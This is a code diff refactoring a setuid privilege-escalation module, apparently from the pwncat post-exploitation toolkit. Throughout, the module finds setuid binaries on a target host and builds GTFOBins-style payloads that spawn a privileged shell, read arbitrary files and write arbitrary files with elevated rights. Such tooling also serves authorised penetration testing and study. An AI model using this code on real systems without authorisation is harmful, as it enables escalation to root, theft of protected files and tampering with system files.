@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
-from typing import Generator, List
+from typing import Generator, List, BinaryIO
 import shlex
 import sys
 from time import sleep
 import os
 from colorama import Fore, Style
-
 import io
 
-from pwncat.privesc.base import Method, PrivescError, Technique, Capability
-from pwncat import gtfobins
+from pwncat.privesc.base import Method, PrivescError, Technique
+from pwncat.gtfobins import Binary, Stream, Capability, MethodWrapper, BinaryNotFound
 from pwncat.file import RemoteBinaryPipe
 from pwncat import util
 
@@ -43,8 +42,10 @@ class SetuidMethod(Method):
         ) as stream:
             util.progress("searching for setuid binaries")
             for path in stream:
-                path = path.strip()
-                util.progress(f"searching for setuid binaries: {path}")
+                path = path.strip().decode("utf-8")
+                util.progress(
+                    f"searching for setuid binaries: {os.path.basename(path)}"
+                )
                 files.append(path)
 
         util.success("searching for setuid binaries: complete", overlay=True)
@@ -61,7 +62,7 @@ class SetuidMethod(Method):
             if path not in self.suid_paths[user]:
                 self.suid_paths[user].append(path)
 
-    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
+    def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
 
         # Update the cache for the current user
@@ -70,44 +71,90 @@ class SetuidMethod(Method):
         known_techniques = []
         for user, paths in self.suid_paths.items():
             for path in paths:
-                binary = gtfobins.Binary.find(self.pty.which, path=path)
-                if binary is not None:
-                    if (capability & binary.capabilities) == 0:
-                        continue
 
-                    known_techniques.append(
-                        Technique(user, self, binary, binary.capabilities)
-                    )
+                try:
+                    binary = self.pty.gtfo.find_binary(path, caps)
+                except BinaryNotFound:
+                    continue
+
+                known_techniques.append(
+                    Technique(user, self, (path, binary), binary.caps)
+                )
 
         return known_techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
-        binary = technique.ident
-        enter, input, exit = binary.shell(self.pty.shell, suid=True)
+        path: str = None
+        binary: Binary = None
+        path, binary = technique.ident
+
+        try:
+            method = next(binary.iter_methods(path, Capability.SHELL, Stream.ANY))
+        except StopIteration:
+            # This shouldn't happen, but it could.
+            raise PrivescError("no shell methods available")
+
+        # Build the payload
+        payload, input_data, exit_cmd = method.build(shell=self.pty.shell, suid=True)
 
         # Run the start commands
-        self.pty.process(enter, delim=False)
+        self.pty.process(payload, delim=False)
 
         # Send required input
-        self.pty.client.send(input.encode("utf-8"))
+        self.pty.client.send(input_data.encode("utf-8"))
 
-        return exit  # remember how to close out of this privesc
+        return exit_cmd  # remember how to close out of this privesc
 
-    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
-        binary = technique.ident
-        read_payload = binary.read_file(filepath)
+    def read_file(self, filepath: str, technique: Technique) -> BinaryIO:
 
-        read_pipe = self.pty.subprocess(read_payload)
+        path: str
+        binary: Binary
+        path, binary = technique.ident
 
-        return read_pipe
+        try:
+            method = next(binary.iter_methods(path, Capability.READ))
+        except StopIteration:
+            # This means we had no avaiable file read methods
+            raise PrivescError("no read file methods available")
+
+        payload, input_data, exit_cmd = method.build(lfile=filepath, suid=True)
+
+        # Send the read payload
+        pipe = self.pty.subprocess(payload, "rb", data=input_data.encode("utf-8"))
+
+        # Wrap the stream in case this is an encoded read
+        pipe = method.wrap_stream(pipe, "rb", exit_cmd)
+
+        return pipe
 
     def write_file(self, filepath: str, data: bytes, technique: Technique):
-        binary = technique.ident
-        payload = binary.write_file(filepath, data)
 
-        self.pty.run(payload)
+        # Extract our path and binary
+        path: str
+        binary: Binary
+        path, binary = technique.ident
+
+        try:
+            # Lookup the first write method from the queue
+            method = next(
+                binary.iter_methods(path, Capability.WRITE, stream=Stream.ANY)
+            )
+        except StopIteration:
+            # This means we had no avaiable file read methods
+            raise PrivescError("no read file methods available")
+
+        payload, input_data, exit_cmd = method.build(
+            lfile=filepath, length=len(data), suid=True
+        )
+
+        # Send the read payload
+        pipe = self.pty.subprocess(payload, "wb", data=input_data.encode("utf-8"))
+
+        # Wrap the stream in case this is an encoded write
+        with method.wrap_stream(pipe, "wb", exit_cmd) as pipe:
+            pipe.write(data)
 
     def get_name(self, tech: Technique):
-        return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident.path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
+        return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident[0]}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
